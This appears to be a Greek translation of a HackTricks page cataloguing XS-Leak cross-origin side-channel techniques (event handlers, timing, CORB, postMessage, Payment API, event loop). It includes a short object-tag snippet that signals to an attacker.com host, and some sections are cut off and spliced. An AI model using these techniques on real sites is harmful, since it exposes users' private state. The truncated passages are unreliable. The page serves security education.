# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε [****](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με την υποστήριξη των πιο προηγμένων εργαλείων της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 ομάδα [**Discord**](https://discord.gg/hRep4RUj7f) ή στην ομάδα [**telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

## Βασικές Πληροφορίες

Το XS-Search είναι μια μέθοδος που χρησιμοποιείται για την **εξαγωγή διασυνοριακών πληροφοριών** εκμεταλλευόμενη **ευπαθείς πλευρικές ευκαιρίες**.

Κύρια στοιχεία που συμμετέχουν σε αυτήν την επίθεση περιλαμβάνουν:

* **Ευπαθής Ιστοσελίδα**: Η ιστοσελίδα-στόχος από την οποία προορίζεται να εξαχθούν πληροφορίες.
* **Ιστοσελίδα του Επιτιθέμενου**: Η κακόβουλη ιστοσελίδα που δημιουργεί ο επιτιθέμενος, την οποία επισκέπτεται ο θύμα, φιλοξενώντας την εκμετάλλευση.
* **Μέθοδος Ενσωμάτωσης**: Η τεχνική που χρησιμοποιείται για να ενσωματώσει την Ευπαθή Ιστοσελίδα στην Ιστοσελίδα του Επιτιθέμενου (π.χ., window.open, iframe, fetch, ετικέτα HTML με href, κλπ.).
* **Τεχνική Διαρροής**: Τεχνικές που χρησιμοποιούνται για να διακρίνουν διαφορές στην κατάσταση της Ευπαθούς Ιστοσελίδας με βάση τις πληροφορίες που συλλέγονται μέσω της μεθόδου ενσωμάτωσης.
* **Καταστάσεις**: Οι δύο πιθανές συνθήκες της Ευπαθούς Ιστοσελίδας, τις οποίες ο επιτιθέμενος στοχεύει να διακρίνει.
* **Ανιχνεύσιμες Διαφορές**: Παρατηρήσιμες διακυμάνσεις στις οποίες βασίζεται ο επιτιθέμενος για να συμπεράνει την κατάσταση της Ευπαθούς Ιστοσελίδας.

### Ανιχνεύσιμες Διαφορές

Μπορούν να αναλυθούν αρκετά στοιχεία για να διακριθούν οι καταστάσεις της Ευπαθούς Ιστοσελίδας:

* **Κωδικός Κατάστασης**: Διάκριση μεταξύ **διαφόρων κωδικών κατάστασης απάντησης HTTP** διασυνοριακά, όπως σφάλματα εξυπηρετητή, σφάλματα πελάτη ή σφάλματα πιστοποίησης.
* **Χρήση API**: Αναγνώριση **χρήσης των Web APIs** σε διάφορες σελίδες, αποκαλύπτοντας εάν μια διασυνοριακή σελίδα χρησιμοποιεί ένα συγκεκριμένο JavaScript Web API.
* **Ανακατευθύνσεις**: Ανίχνευση πλοήγησης σε διαφορετικές σελίδες, όχι μόνο HTTP ανακατευθύνσεις αλλά και αυτές που προκαλούνται από JavaScript ή HTML.
* **Περιεχόμενο Σελίδας**: Παρατήρηση **διακυμάνσεων στο σώμα της απάντησης HTTP** ή στους υπο-πόρους της σελίδας, όπως το **πλήθος των ενσωματωμένων πλαισίων** ή οι ανισότητες στο μέγεθος των εικόνων.
* **Κεφαλίδα HTTP**: Παρατήρηση της παρουσίας ή ίσως της τιμής μιας **συγκεκριμένης κεφαλίδας απάντησης HTTP**, συμπεριλαμβανομένων κεφαλίδων όπως X-Frame-Options, Content-Disposition και Cross-Origin-Resource-Policy.
* **Χρονοδιάγραμμα**: Παρατήρηση συνεχών χρονικών ανισοτήτων μεταξύ των δύο καταστάσεων.

### Μέθοδοι Ενσωμάτωσης

* **Στοιχεία HTML**: Το HTML προσφέρει διάφορα στοιχεία για **ενσωμάτωση πόρων διασυνοριακά**, όπως φύλλα στυλ, εικόνες ή scripts, ώθοντας τον περιηγητή να ζητήσει ένα μη-HTML πόρο. Μια συλλογή πιθανών στοιχείων HTML για αυτόν τον σκοπό μπορεί να βρεθεί στο [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Πλαίσια**: Στοιχεία όπως **iframe**, **object** και **embed** μπορούν να ενσωματώσουν πόρους HTML απευθείας στη σελίδα του επιτιθέμενου. Αν η σελίδα **λείπει προστασία πλαισίου**, το JavaScript μπορεί να έχει πρόσβαση στο αντικείμενο παραθύρου του πλαισίου που περιέχει μέσω της ιδιότητας contentWindow.
* **Αναδυόμενα Παράθυρα**: Η μέθοδος **`window.open`** ανοίγει έναν πόρο σε ένα νέο παράθυρο ή καρτέλα, παρέχοντας ένα **χειριστή παραθύρου** για το JavaScript να αλληλεπιδρά με μεθόδους και ιδιότητες ακολουθώντας το SOP. Τα αναδυόμενα παράθυρα, συχνά χρησιμοποιούμενα στην ενιαία είσοδο, παρακάμπτουν τις περιορισμούς πλαισίου και cookie ενός στόχου πόρου. Ωστόσο, οι σύγχρονοι περιηγητές περιορίζουν τη δημιουργία αναδυόμενων παραθύρων σε συγκεκριμένες ενέργειες χρήστη.
* **Αιτήσεις JavaScript**: Το JavaScript επιτρέπει απευθείας αιτήσεις σε στόχους πόρους χρησιμοποιώντας **XMLHttpRequests** ή το **Fetch API**. Αυτές οι μέθοδοι προσφέρουν ακριβή έλεγχο επί της αιτήσεως, όπως η επιλογή να ακολουθήσουν HTTP ανακατευθύνσεις.

### Τεχνικές Διαρροής

* **Χειριστής Γεγονότος**: Μια κλασική τεχνική διαρροής στα XS-Leaks, όπου οι χειριστές γεγονότων όπως **onload** και **onerror** παρέχουν πληροφορίες σχετικά με την επιτυχία ή την αποτυχία φόρτωσης πόρων.
* **Μηνύματα Σφαλμάτων**: Οι εξαιρέσεις JavaScript ή ειδικές σελίδες σφαλμάτων μπορούν να παρέχουν
## **Τεχνικές βασισμένες στο χρονισμό**

Κάποιες από τις παρακάτω τεχνικές θα χρησιμοποιήσουν το χρόνο ως μέρος της διαδικασίας για την ανίχνευση διαφορών στις πιθανές καταστάσεις των ιστοσελίδων. Υπάρχουν διαφορετικοί τρόποι μέτρησης του χρόνου σε έναν περιηγητή ιστού.

**Ρολόγια**: Το API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) επιτρέπει στους προγραμματιστές να λαμβάνουν μετρήσεις υψηλής ανάλυσης του χρόνου.\
Υπάρχει ένας σημαντικός αριθμός API που οι επιτιθέμενοι μπορούν να καταχραστούν για να δημιουργήσουν σιωπηρά ρολόγια: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations και άλλα.\
Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Τεχνικές Χειριστή Συμβάντων

### Onload/Onerror

* **Μέθοδοι Ενσωμάτωσης**: Frames, Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Σύνοψη**: Αν προσπαθείτε να φορτώσετε ένα πόρο και τα συμβάντα onerror/onload ενεργοποιούνται όταν ο πόρος φορτώνεται με επιτυχία/ανεπιτυχώς, είναι δυνατό να ανιχνευθεί ο κωδικός κατάστασης.
* **Παράδειγμα κώδικα**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Το παράδειγμα κώδικα προσπαθεί να **φορτώσει αντικείμενα σεναρίων από JS**, αλλά **άλλες ετικέτες** όπως αντικείμενα, φύλλα στυλ, εικόνες, ήχους μπορούν επίσης να χρησιμοποιηθούν. Επιπλέον, είναι επίσης δυνατό να ενσωματώσετε τη **σήμανση απευθείας** και να δηλώσετε τα συμβάντα `onload` και `onerror` μέσα στη σήμανση (αντί να το ενσωματώσετε από το JS).

Υπάρχει επίσης μια έκδοση αυτής της επίθεσης χωρίς σενάριο:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
### Onload Timing

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Χρονισμός (συνήθως λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Σύνοψη:** Το [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο χρειάζεται για να πραγματοποιηθεί μια αίτηση. Ωστόσο, μπορούν να χρησιμοποιηθούν και άλλοι χρονόμετροι, όπως το [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) που μπορεί να αναγνωρίσει εργασίες που τρέχουν για περισσότερο από 50ms.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) ένα άλλο παράδειγμα στο:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Αυτή η τεχνική είναι παρόμοια με την προηγούμενη, αλλά ο **επιτιθέμενος** θα επιβάλει επίσης κάποια ενέργεια να πάρει ένα **σημαντικό χρονικό διάστημα** όταν η **απάντηση είναι θετική ή αρνητική** και να μετρήσει αυτόν τον χρόνο.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Χρονισμός (συνήθως λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Σύνοψη:** Το [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο χρειάζεται για να πραγματοποιηθεί μια αίτηση. Μπορούν να χρησιμοποιηθούν και άλλοι χρονόμετροι.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Ο χρόνος που απαιτείται για τη λήψη ενός πόρου μπορεί να μετρηθεί χρησιμοποιώντας τα γεγονότα [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) και [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). Το γεγονός **`beforeunload`** εκτελείται όταν ο περιηγητής είναι έτοιμος να μεταβεί σε μια νέα σελίδα, ενώ το γεγονός **`unload`** συμβαίνει όταν η μετάβαση πραγματοποιείται πραγματικά. Η διαφορά χρόνου μεταξύ αυτών των δύο γεγονότων μπορεί να υπολογιστεί για να προσδιοριστεί η **διάρκεια που ο περιηγητής ξόδεψε για τη λήψη του πόρου**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Χρονισμός (συνήθως λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Σύνοψη:** Το [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο χρειάζεται για να πραγματοποιηθεί μια αίτηση. Μπορούν να χρησιμοποιηθούν και άλλοι χρονόμετροι.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Έχει παρατηρηθεί ότι στην απουσία [Προστασίας Πλαισίωσης](https://xsleaks.dev/docs/defenses/opt-in/xfo/), ο χρόνος που απαιτείται για τη φόρτωση μιας σελίδας και των υπο-πόρων της μέσω του δικτύου μπορεί να μετρηθεί από έναν επιτιθέμενο. Αυτή η μέτρηση είναι συνήθως δυνατή επειδή το χειριστήριο `onload` ενός iframe ενεργοποιείται μόνο μετά την ολοκλήρωση της φόρτωσης των πόρων και της εκτέλεσης JavaScript. Για να παρακάμψει τη μεταβλητότητα που εισάγει η εκτέλεση σεναρίων, ένας επιτιθέμενος ενδέχεται να χρησιμοποιήσει το χαρακτηριστικό [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) μέσα στο `<iframe>`. Η περιλαμβανόμενη αυτού του χαρακτηριστικού περιορίζει πολλαπλές λειτουργίες, κυρίως την εκτέλεση JavaScript, διευκολύνοντας έτσι μια μέτρηση που επηρεάζεται κυρίως από την απόδοση του δικτύου.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + σφάλμα + onload

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**:
* **Σύνοψη**: Εάν μπορείτε να προκαλέσετε σφάλμα στη σελίδα όταν προσπελαύνεται το σωστό περιεχόμενο και να τη φορτώσετε σωστά όταν προσπελαύνεται οποιοδήποτε περιεχόμενο, τότε μπορείτε να δημιουργήσετε έναν βρόχο για να εξάγετε όλες τις πληροφορίες χωρίς να μετράτε τον χρόνο.
* **Παράδειγμα Κώδικα**:

Υποθέστε ότι μπορείτε **να εισάγετε** τη **σελίδα** που περιέχει το **μυστικό** περιεχόμενο **μέσα σε ένα Iframe**.

Μπορείτε **να κάνετε το θύμα να αναζητήσει** το αρχείο που περιέχει "_**σημαία**_" χρησιμοποιώντας ένα **Iframe** (εκμεταλλευόμενοι ένα CSRF για παράδειγμα). Μέσα στο Iframe γνωρίζετε ότι το _**συμβάν onload**_ θα **εκτελεστεί πάντα τουλάχιστον μία φορά**. Στη συνέχεια, μπορείτε **να αλλάξετε** το **URL** του **iframe** αλλάζοντας μόνο το **περιεχόμενο** του **hash** μέσα στο URL.

Για παράδειγμα:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Εάν το πρώτο URL φορτώθηκε **με επιτυχία**, τότε, όταν **αλλάξετε** το **μέρος hash** του URL το **συμβάν onload δεν θα ενεργοποιηθεί** ξανά. Αλλά **αν** η σελίδα είχε κάποιο είδος **σφάλματος** κατά τη **φόρτωση**, τότε το συμβάν **onload θα ενεργοποιηθεί ξανά**.

Έτσι, μπορείτε **να διακρίνετε μεταξύ** μιας σελίδας που φορτώθηκε **σωστά** ή σελίδας που έχει ένα **σφάλμα** όταν προσπελαύνεται.

### Εκτέλεση Javascript

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**:
* **Σύνοψη**: Εάν η **σελίδα** επιστρέφει το **ευαίσθητο** περιεχόμενο, **ή** ένα **περιεχόμενο** που μπορεί να ελεγχθεί από τον χρήστη. Ο χρήστης θα μπορούσε να ορίσει **έγκυρο κώδικα JS στην αρνητική περίπτωση**, και να **φορτώσει** κάθε προσπάθεια μέσα σε **`<script>`** ετικέτες, έτσι στις **αρνητικές** περιπτώσεις ο κώδικας των επιτιθέμενων **εκτελείται**, και στις **θετικές** περιπτώσεις **τίποτα** δεν θα εκτελεστεί.
* **Παράδειγμα Κώδικα**:

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης & Επικεφαλίδες
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Σύνοψη**: Το **Cross-Origin Read Blocking (CORB)** είναι μια μέτρηση ασφαλείας που εμποδίζει τις ιστοσελίδες από το να φορτώνουν ορισμένους ευαίσθητους διασυνοριακούς πόρους για να προστατευτούν από επιθέσεις όπως το **Spectre**. Ωστόσο, οι επιτιθέμενοι μπορούν να εκμεταλλευτούν την προστατευτική συμπεριφορά του. Όταν μια απάντηση υπόκειται σε **CORB** επιστρέφει ένα _**προστατευμένο από CORB**_ `Content-Type` με `nosniff` και έναν κωδικό κατάστασης `2xx`, το **CORB** αφαιρεί το σώμα και τις επικεφαλίδες της απάντησης. Οι επιτιθέμενοι παρατηρώντας αυτό μπορούν να συμπεράνουν τον συνδυασμό του **κωδικού κατάστασης** (που υποδηλώνει επιτυχία ή σφάλμα) και του `Content-Type` (που υποδηλώνει εάν προστατεύεται από το **CORB**), οδηγώντας σε πιθανή διαρροή πληροφοριών.
* **Παράδειγμα Κώδικα**:

Ελέγξτε τον σύνδεσμο με τις περισσότερες πληροφορίες για περισσότερες πληροφορίες σχετικά με την επίθεση.

### onblur

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Σύνοψη**: Διαρροή ευαίσθητων δεδομένων από το χαρακτηριστικό id ή name.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Είναι δυνατόν να **φορτώσετε μια σελίδα** μέσα σε ένα **iframe** και να χρησιμοποιήσετε το **`#id_value`** για να κάνετε τη σελίδα **εστιασμένη στο στοιχείο** του iframe με το συγκεκριμένο id, έτσι αν ένα σήμα **`onblur`** ενεργοποιηθεί, το στοιχείο ID υπάρχει.\
Μπορείτε να πραγματοποιήσετε την ίδια επίθεση με ετικέτες **`portal`**.

### Εκπομπές postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Χρήση API
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Σύνοψη**: Συγκέντρωση ευαίσθητων πληροφοριών από ένα postMessage ή χρήση της παρουσίας των postMessages ως μαντείο για να γνωρίζετε την κατάσταση του χρήστη στη σελίδα
* **Παράδειγμα Κώδικα**: `Οποιοδήποτε κώδικας που ακούει όλα τα postMessages.`

Οι εφαρμογές χρησιμοποιούν συχνά τις [`εκπομπές postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) για να επικοινωνούν σε διαφορετικές προέλες. Ωστόσο, αυτή η μέθοδος μπορεί ακούσια να αποκαλύψει **ευαίσθητες πληροφορίες** εάν η παράμετρος `targetOrigin` δεν καθορίζεται σωστά, επιτρέποντας σε οποιοδήποτε παράθυρο να λαμβάνει τα μηνύματα. Επιπλέον, η απλή λήψη ενός μηνύματος μπορεί να λειτουργήσει ως **μαντείο**· για παράδειγμα, ορισμένα μηνύματα μπορεί να σταλούν μόνο σε χρήστες που έχουν συνδεθεί. Έτσι, η παρουσία ή η απουσία αυτών των μηνυμάτων μπορεί να αποκαλύψει πληροφορίες σχετικά με την κατάσταση ή την ταυτότητα του χρήστη, όπως εάν έχουν ελεγχθεί ταυτοποιημένα ή όχι.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) για να δημιουργήσετε εύκολα και να **αυτ
### Πληρωμών API

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Χρήση API
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Σύνοψη**: Ανίχνευση Αιτήματος Πληρωμής επειδή μόνο ένα μπορεί να είναι ενεργό ταυτόχρονα.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Αυτό το XS-Leak επιτρέπει σε έναν επιτιθέμενο να **ανιχνεύσει πότε μια σελίδα διασταυρού προέλευσης εκκινεί ένα αίτημα πληρωμής**.

Επειδή **μόνο ένα αίτημα πληρωμής μπορεί να είναι ενεργό** ταυτόχρονα, αν η ιστοσελίδα-στόχος χρησιμοποιεί το Payment Request API, οποιαδήποτε **προσπάθεια να χρησιμοποιήσει αυτό το API θα αποτύχει**, και θα προκαλέσει μια **εξαίρεση JavaScript**. Ο επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό προσπαθώντας **περιοδικά να εμφανίσει το UI του Payment API**. Αν μια προσπάθεια προκαλέσει μια εξαίρεση, η ιστοσελίδα-στόχος το χρησιμοποιεί αυτή τη στιγμή. Ο επιτιθέμενος μπορεί να κρύψει αυτές τις περιοδικές προσπάθειες κλείνοντας αμέσως το UI μετά τη δημιουργία του.

### Χρονοδιάγραμμα του Κύκλου Γεγονότων <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Μέθοδοι Ενσωμάτωσης**:
* **Ανιχνεύσιμη Διαφορά**: Χρονοδιάγραμμα (συνήθως λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Σύνοψη:** Μέτρηση του χρόνου εκτέλεσης μιας ιστοσελίδας κατάχρησης του μονονηματικού κύκλου γεγονότων του JS.
* **Παράδειγμα Κώδικα**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

Το JavaScript λειτουργεί με βάση το [μονονηματικό κύκλο γεγονότων](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), υποδηλώνοντας ότι **μπορεί να εκτελέσει μόνο μια εργασία τη φορά**. Αυτό το χαρακτηριστικό μπορεί να εκμεταλλευτεί για να μετρήσει **πόσο χρόνο χρειάζεται για να εκτελεστεί κώδικας από διαφορετική προέλευση**. Ένας επιτιθέμενος μπορεί να μετρήσει τον χρόνο εκτέλεσης του δικού του κώδικα στον κύκλο γεγονότων αποστέλλοντας συνεχώς γεγονότα με σταθερές ιδιότητες. Αυτά τα γεγονότα θα επεξεργαστούν όταν η ουρά γεγονότων είναι άδεια. Αν και άλλες προελεύσεις αποστέλλουν επίσης γεγονότα στην ίδια ουρά, ένας **επιτιθέμενος μπορεί να συμπεράνει το χρόνο που χρειάζεται για αυτά τα εξωτερικά γεγονότα να εκτελεστούν παρατηρώντας καθυστερήσεις στην εκτέλεση των δικών του εργασιών**. Αυτή η μέθοδος παρακολούθησης του κύκλου γεγονότων για καθυστερήσεις μπορεί να αποκαλύψει τον χρόνο εκτέλεσης κώδικα από διαφορετικές προελεύσεις, αποκαλύπτοντας ευαίσθητες πληροφορίες.

{% hint style="warning" %}
Σε μια μέτρηση χρονοδιαγράμματος είναι δυνατόν να **εξαλειφθούν** **παράγοντες δικτύου** για να ληφθούν **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν τη φόρτωσή της.
{% endhint %}

### Απασχολημένος Κύκλος Γεγονότων <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Μέθοδοι Ενσωμάτωσης**:
* **Ανιχνεύσιμη Διαφορά**: Χρονοδιάγραμμα (συνήθως λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Σύνοψη:** Μια μέθοδος για να μετρήσει κάποιος τον χρόνο εκτέλεσης μιας ιστοσελίδας περιλαμβάνει το εσκεμμένο μπλοκάρισμα του κύκλου γεγονότων ενός νήματος και στη συνέχεια το χρονομέτρημα **πόσο χρόνο χρειάζεται για να γίνει ξανά διαθέσιμος ο κύκλος γεγονότων**. Εισάγοντας μια λειτουργία μπλοκαρίσματος (όπως μια μακρά υπολογιστική εργασία ή μια σύγχρονη κλήση API) στον κύκλο γεγονότων και παρακολουθώντας το χρόνο που χρειάζεται για την έναρξη της επόμενης εκτέλεσης κώδικα, μπορεί κανείς να συμπεράνει τη διάρκεια των εργασιών που εκτελούνταν στον κύκλο γεγονότων κατά τη διάρκεια της περιόδου μπλοκαρίσματος. Αυτή η τεχνική εκμεταλλεύεται τη μονονηματική φύση του κύκλου γεγονότων του JavaScript, όπου οι εργασίες εκτελούνται σειριακά, και μπορεί να παρέχει εισαγωγές σχετικά με την απόδοση ή τη συμπεριφορά άλλων λειτουργιών που μοιράζονται το ίδιο νήμα.

* **Παράδειγμα Κώδικα**:

Ένα σημαντικό πλεονέκτημα της τεχνικής μέτρησης του χρόνου εκτέλεσης με το κλείδωμα του κύκλου γεγονότων είναι η δυνατότητά του να παρακάμψει τη **Μόνωση Ιστότοπου**. Η **Μόνωση Ιστότοπου** είναι μια λειτουργία ασφαλείας που διαχωρίζει διαφορετικές ιστοσελίδες σε ξεχωριστές διεργασίες, με στόχο να αποτρέψει τις κακόβουλες ιστοσελίδες από το άμεσο πρόσβαση σε ευαίσθητα δεδομένα από άλλες ιστοσελίδες. Ωστόσο, επηρεάζοντας την εκτέλεση μιας άλλης προέλευσης μέσω του κοινόχρηστου κύκλου γεγονότων, ένας επιτιθέμενος μπορεί να εξάγει έμμεσα πληροφορίες σχετικά με τις δραστηριότητες αυτής της προέλευσης. Αυτή η μέθοδος δεν βασίζεται στην άμεση πρόσβαση στα δεδομένα της άλλης προέλευσης, αλλά παρατηρεί τις επιπτώσεις των δραστηριοτήτων αυτής της προέλευσης στον κοινό κύκλο γεγονότων, αποφεύγοντας έτσι τα προστατευτικά φράγματα που έχει θεσπίσει η **Μόνωση Ιστότοπου**.

{% hint style="warning" %}
Σε μια μέτρηση χρονοδιαγ
## Τεχνικές API Απόδοσης

Το [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) προσφέρει εισαγωγές στις μετρήσεις απόδοσης των web εφαρμογών, εμπλουτισμένες περαιτέρω από το [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). Το Resource Timing API επιτρέπει την παρακολούθηση λεπτομερών χρονομετρήσεων δικτυακών αιτημάτων, όπως η διάρκεια των αιτημάτων. Ειδικότερα, όταν οι διακομιστές περιλαμβάνουν τον κεφαλίδα `Timing-Allow-Origin: *` στις απαντήσεις τους, διατίθενται επιπλέον δεδομένα όπως το μέγεθος μεταφοράς και ο χρόνος αναζήτησης τομέα.

